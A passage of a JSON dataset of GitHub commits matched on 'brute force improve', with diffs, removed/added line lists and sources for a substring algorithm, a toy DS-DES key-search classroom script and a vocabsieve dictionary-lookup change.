ig"}},"https:\/\/github.com\/justanindieguy\/coding-problems":{"2e4fdd3e792fc498c9523de211ef6580402c1b49":{"url":"https:\/\/api.github.com\/repos\/justanindieguy\/coding-problems\/commits\/2e4fdd3e792fc498c9523de211ef6580402c1b49","html_url":"https:\/\/github.com\/justanindieguy\/coding-problems\/commit\/2e4fdd3e792fc498c9523de211ef6580402c1b49","message":"improve python function to get largest unique substring using brute-force approach","sha":"2e4fdd3e792fc498c9523de211ef6580402c1b49","keyword":"brute force improve","diff":"diff --git a\/SlidingWindow\/UniqueSubstring\/main.py b\/SlidingWindow\/UniqueSubstring\/main.py\nindex 60f1adf..4ea90ed 100644\n--- a\/SlidingWindow\/UniqueSubstring\/main.py\n+++ b\/SlidingWindow\/UniqueSubstring\/main.py\n@@ -4,12 +4,10 @@ def has_unique_characters(s: str):\n \n # Brute-Force Approach - O(N^3)\n def get_largest_unique_substring(s: str):\n-    chars = list(s)\n-\n     largest_substring = \"\"\n-    for i, char1 in enumerate(chars):\n-        for j, char2 in enumerate(chars[i:], start=i):\n-            substring = \"\".join(chars[i:j+1])\n+    for i, char1 in enumerate(s):\n+        for j, char2 in enumerate(s[i:], start=i):\n+            substring = s[i:j+1]\n             is_larger = len(substring) > len(largest_substring)\n \n             if has_unique_characters(substring) and is_larger:\n@@ -49,7 +47,7 @@ def get_largest_unique_substring_sw(s: str):\n \n def main():\n     s = input()\n-    print(get_largest_unique_substring_sw(s))\n+    print(get_largest_unique_substring(s))\n \n \n if __name__ == \"__main__\":\n","files":{"\/SlidingWindow\/UniqueSubstring\/main.py":{"changes":[{"diff":"\n \n # Brute-Force Approach - O(N^3)\n def get_largest_unique_substring(s: str):\n-    chars = list(s)\n-\n     largest_substring = \"\"\n-    for i, char1 in enumerate(chars):\n-        for j, char2 in enumerate(chars[i:], start=i):\n-            substring = \"\".join(chars[i:j+1])\n+    for i, char1 in enumerate(s):\n+        for j, char2 in enumerate(s[i:], start=i):\n+            substring = s[i:j+1]\n             is_larger = len(substring) > len(largest_substring)\n \n             if has_unique_characters(substring) and is_larger:\n","add":3,"remove":5,"filename":"\/SlidingWindow\/UniqueSubstring\/main.py","badparts":["    chars = list(s)","    for i, char1 in enumerate(chars):","        for j, char2 in enumerate(chars[i:], start=i):","            substring = \"\".join(chars[i:j+1])"],"goodparts":["    for i, char1 in enumerate(s):","        for j, char2 in enumerate(s[i:], start=i):","            substring = s[i:j+1]"]},{"diff":"\n \n def main():\n     s = input()\n-    print(get_largest_unique_substring_sw(s))\n+    print(get_largest_unique_substring(s))\n \n \n if __name__ == \"__main__\":\n","add":1,"remove":1,"filename":"\/SlidingWindow\/UniqueSubstring\/main.py","badparts":["    print(get_largest_unique_substring_sw(s))"],"goodparts":["    print(get_largest_unique_substring(s))"]}],"source":"\ndef has_unique_characters(s: str): return len(s)==len(set(s)) def get_largest_unique_substring(s: str): chars=list(s) largest_substring=\"\" for i, char1 in enumerate(chars): for j, char2 in enumerate(chars[i:], start=i): substring=\"\".join(chars[i:j+1]) is_larger=len(substring) > len(largest_substring) if has_unique_characters(substring) and is_larger: largest_substring=substring return largest_substring def get_largest_unique_substring_sw(s: str): i, j=0, 0 start_window, window_length, max_window_length=-1, 0, 0 occurrences={} while j < len(s): ch=s[j] if ch in occurrences and occurrences[ch] >=i: i=occurrences[ch] +1 window_length=j -i occurrences[ch]=j window_length +=1 j +=1 if window_length > max_window_length: max_window_length=window_length start_window=i end_window=start_window +max_window_length return s[start_window:end_window] def main(): s=input() print(get_largest_unique_substring_sw(s)) if __name__==\"__main__\": main() ","sourceWithComments":"def has_unique_characters(s: str):\n    return len(s) == len(set(s))\n\n\n# Brute-Force Approach - O(N^3)\ndef get_largest_unique_substring(s: str):\n    chars = list(s)\n\n    largest_substring = \"\"\n    for i, char1 in enumerate(chars):\n        for j, char2 in enumerate(chars[i:], start=i):\n            substring = \"\".join(chars[i:j+1])\n            is_larger = len(substring) > len(largest_substring)\n\n            if has_unique_characters(substring) and is_larger:\n                largest_substring = substring\n\n    return largest_substring\n\n\n# Sliding Window Approach - O(N)\ndef get_largest_unique_substring_sw(s: str):\n    i, j = 0, 0\n    start_window, window_length, max_window_length = -1, 0, 0\n    occurrences = {}\n\n    while j < len(s):\n        ch = s[j]\n\n        # Check if is inside hashmap and is in the current window.\n        if ch in occurrences and occurrences[ch] >= i:\n            i = occurrences[ch] + 1\n            # Update remaining window length excluding current char.\n            window_length = j - i\n\n        # Update the last occurrence.\n        occurrences[ch] = j\n        window_length += 1\n        j += 1\n\n        # Update max_window_length at every step.\n        if window_length > max_window_length:\n            max_window_length = window_length\n            start_window = i\n\n    end_window = start_window + max_window_length\n    return s[start_window:end_window]\n\n\ndef main():\n    s = input()\n    print(get_largest_unique_substring_sw(s))\n\n\nif __name__ == \"__main__\":\n    main()\n"}},"msg":"improve python function to get largest unique substring using brute-force approach"}},"https:\/\/github.com\/raykaryshyn\/DS-DES":{"819dc9b21dfc50fadb26bdea0e7938a56dcadeb5":{"url":"https:\/\/api.github.com\/repos\/raykaryshyn\/DS-DES\/commits\/819dc9b21dfc50fadb26bdea0e7938a56dcadeb5","html_url":"https:\/\/github.com\/raykaryshyn\/DS-DES\/commit\/819dc9b21dfc50fadb26bdea0e7938a56dcadeb5","message":"improve brute force code\/comments","sha":"819dc9b21dfc50fadb26bdea0e7938a56dcadeb5","keyword":"brute force improve","diff":"diff --git a\/brute-force.py b\/brute-force.py\nindex e0901a6..f1f665c 100644\n--- a\/brute-force.py\n+++ b\/brute-force.py\n@@ -13,23 +13,26 @@\n \n start_time = time.time()\n \n+# Loop through all possible 20-bit key bundle values.\n for i in range(0b100000000000000000000):\n     current_key = BitArray(uint=i, length=20)\n     current_dsdes = DSDES(current_key.bin, 'b')\n     test = \"\"\n+    # Applies the current_dsdes encryption to all plaintext blocks.\n     for j in range(0, len(plaintext), 2):\n         test += current_dsdes.encrypt(plaintext[j:j+2]).hex\n-    if ''.join(test) == ciphertext:\n+    # Stops if the resulting ciphertext equals the desired ciphertext.\n+    if test == ciphertext:\n         found_keys.extend([current_key[:10].bin, current_key[10:].bin])\n         break\n \n end_time = time.time() - start_time\n \n-print('Found keys:', found_keys)\n+print('Found key bundle:', found_keys)\n hex_key = BitArray(bin=''.join(found_keys)).hex\n-print('20-bit combined key as hex:', hex_key, '\\n')\n+print('20-bit combined key bundle as hex:', hex_key, '\\n')\n \n-print('Testing the found key with the given plaintext \"' +\n+print('Testing the found key bundle with the given plaintext \"' +\n       ''.join([chr(int(plaintext[x:x+2], base=16)) for x in range(0, len(plaintext), 2)]) +\n       '\" (' + plaintext + '):')\n print('Provided ciphertext:\\n\\t', ciphertext)\n@@ -39,6 +42,6 @@\n for j in range(0, len(plaintext), 2):\n     test_ciphertext += test_dsdes.encrypt(plaintext[j:j+2]).hex\n \n-print('Generated ciphertext with provided plaintext and found key (' +\n+print('Generated ciphertext with provided plaintext and found key bundle (' +\n       hex_key + '):\\n\\t', test_ciphertext)\n print('\\nCompleted in', '%.2f' % end_time, 'seconds.')\n","files":{"\/brute-force.py":{"changes":[{"diff":"\n \n start_time = time.time()\n \n+# Loop through all possible 20-bit key bundle values.\n for i in range(0b100000000000000000000):\n     current_key = BitArray(uint=i, length=20)\n     current_dsdes = DSDES(current_key.bin, 'b')\n     test = \"\"\n+    # Applies the current_dsdes encryption to all plaintext blocks.\n     for j in range(0, len(plaintext), 2):\n         test += current_dsdes.encrypt(plaintext[j:j+2]).hex\n-    if ''.join(test) == ciphertext:\n+    # Stops if the resulting ciphertext equals the desired ciphertext.\n+    if test == ciphertext:\n         found_keys.extend([current_key[:10].bin, current_key[10:].bin])\n         break\n \n end_time = time.time() - start_time\n \n-print('Found keys:', found_keys)\n+print('Found key bundle:', found_keys)\n hex_key = BitArray(bin=''.join(found_keys)).hex\n-print('20-bit combined key as hex:', hex_key, '\\n')\n+print('20-bit combined key bundle as hex:', hex_key, '\\n')\n \n-print('Testing the found key with the given plaintext \"' +\n+print('Testing the found key bundle with the given plaintext \"' +\n       ''.join([chr(int(plaintext[x:x+2], base=16)) for x in range(0, len(plaintext), 2)]) +\n       '\" (' + plaintext + '):')\n print('Provided ciphertext:\\n\\t', ciphertext)\n","add":7,"remove":4,"filename":"\/brute-force.py","badparts":["    if ''.join(test) == ciphertext:","print('Found keys:', found_keys)","print('20-bit combined key as hex:', hex_key, '\\n')","print('Testing the found key with the given plaintext \"' +"],"goodparts":["    if test == ciphertext:","print('Found key bundle:', found_keys)","print('20-bit combined key bundle as hex:', hex_key, '\\n')","print('Testing the found key bundle with the given plaintext \"' +"]},{"diff":" for j in range(0, len(plaintext), 2):\n     test_ciphertext += test_dsdes.encrypt(plaintext[j:j+2]).hex\n \n-print('Generated ciphertext with provided plaintext and found key (' +\n+print('Generated ciphertext with provided plaintext and found key bundle (' +\n       hex_key + '):\\n\\t', test_ciphertext)\n print('\\nCompleted in', '%.2f' % end_time, 'seconds.')\n","add":1,"remove":1,"filename":"\/brute-force.py","badparts":["print('Generated ciphertext with provided plaintext and found key (' +"],"goodparts":["print('Generated ciphertext with provided plaintext and found key bundle (' +"]}],"source":"\nfrom bitstring import BitArray from sdes import DSDES import time plaintext='4272757465' ciphertext='52f0be698a' found_keys=[] print('DS-DES Brute Force Attack') print('-------------------------\\n') print('Attacking...\\n') start_time=time.time() for i in range(0b100000000000000000000): current_key=BitArray(uint=i, length=20) current_dsdes=DSDES(current_key.bin, 'b') test=\"\" for j in range(0, len(plaintext), 2): test +=current_dsdes.encrypt(plaintext[j:j+2]).hex if ''.join(test)==ciphertext: found_keys.extend([current_key[:10].bin, current_key[10:].bin]) break end_time=time.time() -start_time print('Found keys:', found_keys) hex_key=BitArray(bin=''.join(found_keys)).hex print('20-bit combined key as hex:', hex_key, '\\n') print('Testing the found key with the given plaintext \"' + ''.join([chr(int(plaintext[x:x+2], base=16)) for x in range(0, len(plaintext), 2)]) + '\"(' +plaintext +'):') print('Provided ciphertext:\\n\\t', ciphertext) test_dsdes=DSDES(''.join(found_keys), 'b') test_ciphertext=\"\" for j in range(0, len(plaintext), 2): test_ciphertext +=test_dsdes.encrypt(plaintext[j:j+2]).hex print('Generated ciphertext with provided plaintext and found key(' + hex_key +'):\\n\\t', test_ciphertext) print('\\nCompleted in', '%.2f' % end_time, 'seconds.') ","sourceWithComments":"from bitstring import BitArray\nfrom sdes import DSDES\nimport time\n\nplaintext = '4272757465'\nciphertext = '52f0be698a'\n\nfound_keys = []\n\nprint('DS-DES Brute Force Attack')\nprint('-------------------------\\n')\nprint('Attacking...\\n')\n\nstart_time = time.time()\n\nfor i in range(0b100000000000000000000):\n    current_key = BitArray(uint=i, length=20)\n    current_dsdes = DSDES(current_key.bin, 'b')\n    test = \"\"\n    for j in range(0, len(plaintext), 2):\n        test += current_dsdes.encrypt(plaintext[j:j+2]).hex\n    if ''.join(test) == ciphertext:\n        found_keys.extend([current_key[:10].bin, current_key[10:].bin])\n        break\n\nend_time = time.time() - start_time\n\nprint('Found keys:', found_keys)\nhex_key = BitArray(bin=''.join(found_keys)).hex\nprint('20-bit combined key as hex:', hex_key, '\\n')\n\nprint('Testing the found key with the given plaintext \"' +\n      ''.join([chr(int(plaintext[x:x+2], base=16)) for x in range(0, len(plaintext), 2)]) +\n      '\" (' + plaintext + '):')\nprint('Provided ciphertext:\\n\\t', ciphertext)\n\ntest_dsdes = DSDES(''.join(found_keys), 'b')\ntest_ciphertext = \"\"\nfor j in range(0, len(plaintext), 2):\n    test_ciphertext += test_dsdes.encrypt(plaintext[j:j+2]).hex\n\nprint('Generated ciphertext with provided plaintext and found key (' +\n      hex_key + '):\\n\\t', test_ciphertext)\nprint('\\nCompleted in', '%.2f' % end_time, 'seconds.')\n"}},"msg":"improve brute force code\/comments"}},"https:\/\/github.com\/FreeLanguageTools\/vocabsieve":{"80f20c057c48de3f71dfc66a22fbb2356bada748":{"url":"https:\/\/api.github.com\/repos\/FreeLanguageTools\/vocabsieve\/commits\/80f20c057c48de3f71dfc66a22fbb2356bada748","html_url":"https:\/\/github.com\/FreeLanguageTools\/vocabsieve\/commit\/80f20c057c48de3f71dfc66a22fbb2356bada748","message":"Improve multi word lookup handling\n\nNow it should brute force all combinations when looking up a phrase.\nShould reduce failures","sha":"80f20c057c48de3f71dfc66a22fbb2356bada748","keyword":"brute force improve","diff":"diff --git a\/vocabsieve\/dictionary.py b\/vocabsieve\/dictionary.py\nindex e34d9b4..2166470 100644\n--- a\/vocabsieve\/dictionary.py\n+++ b\/vocabsieve\/dictionary.py\n@@ -6,7 +6,7 @@\n from typing import Optional, Dict, Tuple\n import time\n import requests\n-\n+import itertools\n from bidict import bidict\n from bs4 import BeautifulSoup\n from markdown import markdown\n@@ -183,26 +183,43 @@ def lookupin(\n     if not word:\n         return word\n     IS_UPPER = word[0].isupper()\n-    if lemmatize:\n+    if lemmatize and not \" \" in word:\n         word = lem_word(word, language, greedy_lemmatize)\n     # The lemmatizer would always turn words lowercase, which can cause\n     # lookups to fail if not recovered.\n     candidates = [word, word.capitalize()] if IS_UPPER else [word]\n+    if \" \" in word:\n+        words = word.split(\" \")\n+        # Try all unlemmatized first, then brute force to test each lemmatized vs unlemmatized combos\n+        combinations = list(itertools.product(*[[word, lem_word(word, language, greedy_lemmatize)] for word in words]))\n+        for combo in combinations:\n+            if IS_UPPER:\n+                candidates.append(\" \".join(combo))\n+                if IS_UPPER:\n+                    candidates.append(\" \".join(combo).capitalize())\n+    candidates = set(candidates)\n+    print(candidates)\n     for word in candidates:\n         try:\n             if dictionary == \"Wiktionary (English)\":\n                 item = wiktionary(word, language)\n                 item['definition'] = fmt_result(item['definition'])\n+                item['word'] = word\n                 return item\n             elif dictionary == \"Google Translate\":\n                 return googletranslate(word, language, gtrans_lang, gtrans_api)\n             else:\n-                return {\n-                    \"word\": word,\n-                    \"definition\": dictdb.define(\n-                        word,\n-                        language,\n-                        dictionary)}\n+                try:\n+                    item = {\n+                        \"word\": word,\n+                        \"definition\": dictdb.define(\n+                            word,\n+                            language,\n+                            dictionary)}\n+                except Exception:\n+                    pass\n+                finally:\n+                    return item\n         except BaseException:\n             pass\n     raise Exception(\"Word not found\")\n","files":{"\/vocabsieve\/dictionary.py":{"changes":[{"diff":"\n     if not word:\n         return word\n     IS_UPPER = word[0].isupper()\n-    if lemmatize:\n+    if lemmatize and not \" \" in word:\n         word = lem_word(word, language, greedy_lemmatize)\n     # The lemmatizer would always turn words lowercase, which can cause\n     # lookups to fail if not recovered.\n     candidates = [word, word.capitalize()] if IS_UPPER else [word]\n+    if \" \" in word:\n+        words = word.split(\" \")\n+        # Try all unlemmatized first, then brute force to test each lemmatized vs unlemmatized combos\n+        combinations = list(itertools.product(*[[word, lem_word(word, language, greedy_lemmatize)] for word in words]))\n+        for combo in combinations:\n+            if IS_UPPER:\n+                candidates.append(\" \".join(combo))\n+                if IS_UPPER:\n+                    candidates.append(\" \".join(combo).capitalize())\n+    candidates = set(candidates)\n+    print(candidates)\n     for word in candidates:\n         try:\n             if dictionary == \"Wiktionary (English)\":\n                 item = wiktionary(word, language)\n                 item['definition'] = fmt_result(item['definition'])\n+                item['word'] = word\n                 return item\n             elif dictionary == \"Google Translate\":\n                 return googletranslate(word, language, gtrans_lang, gtrans_api)\n             else:\n-                return {\n-                    \"word\": word,\n-                    \"definition\": dictdb.define(\n-                        word,\n-                        language,\n-                        dictionary)}\n+                try:\n+                    item = {\n+                        \"word\": word,\n+                        \"definition\": dictdb.define(\n+                            word,\n+                            language,\n+                            dictionary)}\n+                except Exception:\n+                    pass\n+                finally:\n+                    return item\n         except BaseException:\n             pass\n     raise Exception(\"Word not found\")\n","add":24,"remove":7,"filename":"\/vocabsieve\/dictionary.py","badparts":["    if lemmatize:","                return {","                    \"word\": word,","                    \"definition\": dictdb.define(","                        word,","                        language,","                        dictionary)}"],"goodparts":["    if lemmatize and not \" \" in word:","    if \" \" in word:","        words = word.split(\" \")","        combinations = list(itertools.product(*[[word, lem_word(word, language, greedy_lemmatize)] for word in words]))","        for combo in combinations:","            if IS_UPPER:","                candidates.append(\" \".join(combo))","                if IS_UPPER:","                    candidates.append(\" \".join(combo).capitalize())","    candidates = set(candidates)","    print(candidates)","                item['word'] = word","                try:","                    item = {","                        \"word\": word,","                        \"definition\": dictdb.define(","                            word,","                            language,","                            dictionary)}","                except Exception:","                    pass","                finally:","                    return item"]}],"source":"\nimport json import re import unicodedata from threading import Thread from urllib.parse import quote from typing import Optional, Dict, Tuple import time import requests from bidict import bidict from bs4 import BeautifulSoup from markdown import markdown from markdownify import markdownify from.playsound import playsound from.constants import DefinitionDisplayModes, LookUpResults from.db import * from.dictformats import removeprefix from.forvo import * from.lemmatizer import lem_word, removeAccents dictdb=LocalDictionary() gtrans_languages=['af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 'ceb', 'ny', 'zh', 'zh_HANT', 'co', 'hr', 'cs', 'da', 'nl', 'en', 'eo', 'et', 'tl', 'fi', 'fr', 'fy', 'gl', 'ka', 'de', 'el', 'gu', 'ht', 'ha', 'haw', 'hi', 'hmn', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 'kn', 'kk', 'km', 'rw', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 'mk', 'mg', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'or', 'ps', 'fa', 'pl', 'pt', 'pa', 'ro', 'ru', 'sm', 'gd', 'sr', 'st', 'sn', 'sd', 'si', 'sk', 'sl', 'so', 'es', 'su', 'sw', 'sv', 'tg', 'ta', 'tt', 'te', 'th', 'tr', 'tk', 'uk', 'ur', 'ug', 'uz', 'vi', 'cy', 'xh', 'yi', 'yo', 'zu' ] langs_supported=bidict( dict(zip(gtrans_languages,[langcodes[item] for item in gtrans_languages]))) gdict_languages=[ 'en', 'hi', 'es', 'fr', 'ja', 'ru', 'de', 'it', 'ko', 'ar', 'tr', 'pt' ] pronunciation_sources=[\"Forvo(all)\", \"Forvo(best)\"] def preprocess_clipboard(s: str, lang: str) -> str: \"\"\" Pre-process string from clipboard before showing it NOTE: originally intended for parsing JA and ZH, but that feature has been removed for the time being due to maintainence and dependency concerns. \"\"\" return s def fmt_result(definitions): \"Format the result of dictionary lookup\" lines=[] for defn in definitions: if defn['pos'] !=\"\": lines.append(\"<i>\" +defn['pos'] +\"<\/i>\") lines.extend([str(item[0] +1) +\". \" +item[1] for item in list(enumerate(defn['meaning']))]) return \"<br>\".join(lines) def wiktionary(word, language: str) -> Optional[dict]: \"Get definitions from Wiktionary\" try: res=requests.get( 'https:\/\/en.wiktionary.org\/api\/rest_v1\/page\/definition\/' + word, timeout=4) except Exception as e: print(e) return None if res.status_code !=200: raise Exception(\"Lookup error\") definitions=[] data=res.json()[language] for item in data: meanings=[] for defn in item['definitions']: parsed_meaning=BeautifulSoup(defn['definition'], features=\"lxml\") meanings.append(parsed_meaning.text) meaning_item={\"pos\": item['partOfSpeech'], \"meaning\": meanings} definitions.append(meaning_item) return{\"word\": word, \"definition\": definitions} def googletranslate(word, language, gtrans_lang, gtrans_api) -> Optional[LookUpResults]: \"Google translation, through the googletrans python library\" url=f\"{gtrans_api}\/api\/v1\/{language}\/{gtrans_lang}\/{quote(word)}\" res=requests.get(url) if res.status_code==200: return{\"word\": word, \"definition\": res.json()['translation']} return None def getCognatesData(language: str, known_langs: list) -> Optional[List[str]]: \"Get all cognates from the local database in a given language\" start=time.time() data=dictdb.getCognates(language) if not known_langs: return[] if not known_langs[0]: return[] cognates=[] for word, cognates_in in data: for lang in known_langs: if lang in cognates_in: cognates.append(word) break print(\"Got all cognates in\", time.time() -start, \"seconds\") return cognates def getAudio(word: str, language: str, dictionary: str=\"Forvo(all)\", custom_dicts:Optional[list]=None) -> Dict[str, str]: if custom_dicts is None: custom_dicts=[] if dictionary==\"Forvo(all)\": return fetch_audio_all(word, language) elif dictionary==\"Forvo(best)\": return fetch_audio_best(word, language) elif dictionary==\"<all>\": result={} for d in custom_dicts: if d['lang']==language and d['type']=='audiolib': try: data=lookupin( word.lower(), language, lemmatize=False, dictionary=d['name']) if data['definition']: data['definition']=json.loads(data['definition']) rootpath=d['path'] for item in data['definition']: qualified_name=d['name'] +\\ \":\" +os.path.splitext(item)[0] result[qualified_name]=os.path.join( rootpath, item) except Exception: pass return result data=lookupin( word.lower(), language, lemmatize=False, dictionary=dictionary) data['definition']=json.loads(data['definition']) for d in custom_dicts: if d['name']==dictionary and d['lang']==language and d['type']=='audiolib': rootpath=d['path'] break result={} for item in data['definition']: qualified_name=dictionary +\":\" +os.path.splitext(item)[0] result[qualified_name]=os.path.join(rootpath, item) return result def lookupin( word: str, language: str, lemmatize: bool=True, greedy_lemmatize: bool=False, dictionary: str=\"Wiktionary(English)\", gtrans_lang: str=\"en\", gtrans_api: str=\"https:\/\/lingva.ml\") -> Optional[LookUpResults]: if not word: return word IS_UPPER=word[0].isupper() if lemmatize: word=lem_word(word, language, greedy_lemmatize) candidates=[word, word.capitalize()] if IS_UPPER else[word] for word in candidates: try: if dictionary==\"Wiktionary(English)\": item=wiktionary(word, language) item['definition']=fmt_result(item['definition']) return item elif dictionary==\"Google Translate\": return googletranslate(word, language, gtrans_lang, gtrans_api) else: return{ \"word\": word, \"definition\": dictdb.define( word, language, dictionary)} except BaseException: pass raise Exception(\"Word not found\") def getFreq(word, language, lemfreq, dictionary) -> Tuple[int, int]: if lemfreq: word=lem_word(word, language) freq=dictdb.define(word.lower(), language, dictionary) max_freq=dictdb.countEntriesDict(dictionary) return int(freq), int(max_freq) def getDictsForLang(lang: str, dicts: list): \"Get the list of dictionaries for a given language\" results=[\"Wiktionary(English)\", \"Google Translate\"] results.extend([item['name'] for item in dicts if item['lang']== lang and item['type'] !=\"freq\" and item['type'] !='audiolib']) return results def getAudioDictsForLang(lang: str, dicts: list): \"Get the list of audio dictionaries for a given language\" results=[\"<disabled>\"] results.extend(pronunciation_sources) audiolibs=[item['name'] for item in dicts if item['lang'] ==lang and item['type']==\"audiolib\"] results.extend(audiolibs) if len(audiolibs) > 1: results.append(\"<all>\") return results def getFreqlistsForLang(lang: str, dicts: list): return[item['name'] for item in dicts if item['lang']==lang and item['type']==\"freq\"] forvopath=os.path.join(QStandardPaths.writableLocation(QStandardPaths.DataLocation), \"forvo\") def play_audio(name: str, data: Dict[str, str], lang: str) -> str: def crossplatform_playsound(relative_audio_path: str): Thread(target=lambda: playsound(relative_audio_path)).start() audiopath: str=data.get(name, \"\") if not audiopath: return \"\" if not audiopath.startswith(\"https:\/\/\"): crossplatform_playsound(audiopath) return audiopath fpath=os.path.join(forvopath, lang, name) +audiopath[-4:] if not os.path.exists(fpath): res=requests.get(audiopath, headers=HEADERS) if res.status_code !=200: return \"\" os.makedirs(os.path.dirname(fpath), exist_ok=True) with open(fpath, 'bw') as file: file.write(res.content) crossplatform_playsound(fpath) return fpath def process_definition(entry: str, mode: DefinitionDisplayModes, skip: int, newlines: int) -> str: result=entry result=convert_display_mode(result, mode) result=skip_lines(result, skip) result=collapse_newlines(result, newlines) return result def convert_display_mode(entry: str, mode: DefinitionDisplayModes) -> str: if mode in['Raw', 'HTML']: return entry elif mode=='Markdown': return markdownify(entry) elif mode==\"Markdown-HTML\": return markdown_nop(markdownify(entry)) elif mode=='Plaintext': entry=entry.replace(\"<br>\", \"\\n\")\\ .replace(\"<br\/>\", \"\\n\")\\ .replace(\"<BR>\", \"\\n\") entry=re.sub(r\"<.*?>\", \"\", entry) return entry else: raise NotImplementedError(\"Mode not supported\") def is_html(s: str) -> bool: return bool(BeautifulSoup(s, \"html.parser\").find()) def skip_lines(entry: str, number: int) -> str: if is_html(entry): print(\"this is html\") entry=entry.replace(\"<BR>\", \"<br>\")\\ .replace(\"<br\/>\", \"<br>\")\\ .replace(\"<br \/>\", \"<br>\") return \"<br>\".join(entry.split(\"<br>\")[number:]) else: return \"\\n\".join(entry.splitlines()[number:]) def collapse_newlines(entry: str, number: int) -> str: if number==0: return entry if is_html(entry): entry=entry.replace(\"<BR>\", \"<br>\")\\ .replace(\"<br\/>\", \"<br>\")\\ .replace(\"<br \/>\", \"<br>\") return re.sub(r'(\\<br\\>)+', r'<br>' * number, entry) else: return re.sub(r'(\\n)+', r'\\n' * number, entry) def markdown_nop(s: str) -> str: print(removeprefix( markdown(s.replace(\"\\n\", \"\\n\\n\").replace(\".\", \"\\.\")).\\ replace(\"<p>\", \"<br>\").\\ replace(\"<\/p>\", \"\"), \"<br>\")) return removeprefix( markdown(s.replace(\"\\n\", \"\\n\\n\").replace(\".\", \"\\.\")).\\ replace(\"<p>\", \"<br>\").\\ replace(\"<\/p>\", \"\"), \"<br>\" ) ","sourceWithComments":"import json\nimport re\nimport unicodedata\nfrom threading import Thread\nfrom urllib.parse import quote\nfrom typing import Optional, Dict, Tuple\nimport time\nimport requests\n\nfrom bidict import bidict\nfrom bs4 import BeautifulSoup\nfrom markdown import markdown\nfrom markdownify import markdownify\nfrom .playsound import playsound\nfrom .constants import DefinitionDisplayModes, LookUpResults\nfrom .db import *\nfrom .dictformats import removeprefix\nfrom .forvo import *\nfrom .lemmatizer import lem_word, removeAccents\n\ndictdb = LocalDictionary()\n\ngtrans_languages = ['af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn',\n                    'bs', 'bg', 'ca', 'ceb', 'ny', 'zh', 'zh_HANT', 'co', 'hr', 'cs',\n                    'da', 'nl', 'en', 'eo', 'et', 'tl', 'fi', 'fr', 'fy', 'gl', 'ka',\n                    'de', 'el', 'gu', 'ht', 'ha', 'haw', 'hi', 'hmn', 'hu', 'is', 'ig',\n                    'id', 'ga', 'it', 'ja', 'kn', 'kk', 'km', 'rw', 'ko', 'ku', 'ky',\n                    'lo', 'la', 'lv', 'lt', 'lb', 'mk', 'mg', 'ms', 'ml', 'mt', 'mi',\n                    'mr', 'mn', 'my', 'ne', 'no', 'or', 'ps', 'fa', 'pl', 'pt', 'pa',\n                    'ro', 'ru', 'sm', 'gd', 'sr', 'st', 'sn', 'sd', 'si', 'sk', 'sl',\n                    'so', 'es', 'su', 'sw', 'sv', 'tg', 'ta', 'tt', 'te', 'th', 'tr',\n                    'tk', 'uk', 'ur', 'ug', 'uz', 'vi', 'cy', 'xh', 'yi', 'yo', 'zu'\n                    ]\n\nlangs_supported = bidict(\n    dict(zip(gtrans_languages, [langcodes[item] for item in gtrans_languages])))\n\ngdict_languages = [\n    'en', 'hi', 'es', 'fr', 'ja', 'ru', 'de', 'it', 'ko', 'ar', 'tr', 'pt'\n]\n\npronunciation_sources = [\"Forvo (all)\", \"Forvo (best)\"]\n\n\n\ndef preprocess_clipboard(s: str, lang: str) -> str:\n    \"\"\"\n    Pre-process string from clipboard before showing it\n    NOTE: originally intended for parsing JA and ZH, but\n    that feature has been removed for the time being due\n    to maintainence and dependency concerns.\n    \"\"\"\n    return s\n\n\n\n\ndef fmt_result(definitions):\n    \"Format the result of dictionary lookup\"\n    lines = []\n    for defn in definitions:\n        if defn['pos'] != \"\":\n            lines.append(\"<i>\" + defn['pos'] + \"<\/i>\")\n        lines.extend([str(item[0] + 1) + \". \" + item[1]\n                     for item in list(enumerate(defn['meaning']))])\n    return \"<br>\".join(lines)\n\n\ndef wiktionary(word, language: str) -> Optional[dict]:\n    \"Get definitions from Wiktionary\"\n    try:\n        res = requests.get(\n            'https:\/\/en.wiktionary.org\/api\/rest_v1\/page\/definition\/' +\n            word,\n            timeout=4)\n    except Exception as e:\n        print(e)\n        return None\n\n    if res.status_code != 200:\n        raise Exception(\"Lookup error\")\n    definitions = []\n    data = res.json()[language]\n    for item in data:\n        meanings = []\n        for defn in item['definitions']:\n            parsed_meaning = BeautifulSoup(defn['definition'], features=\"lxml\")\n            meanings.append(parsed_meaning.text)\n\n        meaning_item = {\"pos\": item['partOfSpeech'], \"meaning\": meanings}\n        definitions.append(meaning_item)\n    return {\"word\": word, \"definition\": definitions}\n\n\ndef googletranslate(word, language, gtrans_lang, gtrans_api) -> Optional[LookUpResults]:\n    \"Google translation, through the googletrans python library\"\n    url = f\"{gtrans_api}\/api\/v1\/{language}\/{gtrans_lang}\/{quote(word)}\"\n    res = requests.get(url)\n    if res.status_code == 200:\n        return {\"word\": word, \"definition\": res.json()['translation']}\n    return None\n\ndef getCognatesData(language: str, known_langs: list) -> Optional[List[str]]:\n    \"Get all cognates from the local database in a given language\"\n    start = time.time()\n    data = dictdb.getCognates(language)\n    if not known_langs:\n        return []\n    if not known_langs[0]:\n        return []\n    cognates = []\n    for word, cognates_in in data:\n        for lang in known_langs:\n            if lang in cognates_in:\n                cognates.append(word)\n                break\n    print(\"Got all cognates in\", time.time() - start, \"seconds\")\n    return cognates\n\ndef getAudio(word: str, \n             language: str, \n             dictionary: str=\"Forvo (all)\", \n             custom_dicts:Optional[list]=None) -> Dict[str, str]:\n    if custom_dicts is None:\n        custom_dicts = []\n    \n    # should return a dict of audio names and paths to audio\n    if dictionary == \"Forvo (all)\":\n        return fetch_audio_all(word, language)\n    elif dictionary == \"Forvo (best)\":\n        return fetch_audio_best(word, language)\n    elif dictionary == \"<all>\":\n        # We are using all the local dictionaries here.\n        result = {}\n        for d in custom_dicts:\n            if d['lang'] == language and d['type'] == 'audiolib':\n                try:\n                    data = lookupin(\n                        word.lower(),\n                        language,\n                        lemmatize=False,\n                        dictionary=d['name'])\n                    if data['definition']:\n                        data['definition'] = json.loads(data['definition'])\n                        rootpath = d['path']\n                        for item in data['definition']:\n                            qualified_name = d['name'] + \\\n                                \":\" + os.path.splitext(item)[0]\n                            result[qualified_name] = os.path.join(\n                                rootpath, item)\n                except Exception:\n                    pass\n        return 